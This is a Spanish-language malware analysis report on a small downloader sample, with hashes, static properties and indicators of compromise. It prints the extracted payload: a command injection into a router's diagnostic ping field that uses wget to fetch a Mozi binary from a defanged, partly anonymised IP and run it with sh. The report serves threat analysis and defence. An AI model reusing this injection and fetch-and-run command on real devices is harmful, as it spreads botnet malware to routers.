# 🧬 Payload Analysis

`2dbd318931d866f8ede5b2fc07eef3d605bd4b834c5ba2e9aafafa05b63cf60e`

## 📌 Resumen

Texto ASCII de 319 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://14.231.104.XXX:59094/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://14.231.104.XXX:59094/Mozi.m -O ->/tmp/gpon80`
2. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/2dbd318931d866f8ede5b2fc07eef3d605bd4b834c5ba2e9aafafa05b63cf60e.md](../../../../../malware-like/oraculo/downloader/2dbd318931d866f8ede5b2fc07eef3d605bd4b834c5ba2e9aafafa05b63cf60e.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:34:34.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `2dbd318931d866f8ede5b2fc07eef3d605bd4b834c5ba2e9aafafa05b63cf60e`
- **MD5:** `7906b5f39abe636ad6ef48ca98645134`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 319 B |
| Entropía | 5.44 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://14.231.104.XXX:59094/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://14.231.104.XXX:59094/Mozi.m+-O+- | strings |
| ip | 14.231.104.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://14.231.104.XXX:59094/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | 2dbd318931d866f8ede5b2fc07eef3d605bd4b834c5ba2e9aafafa05b63cf60e | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
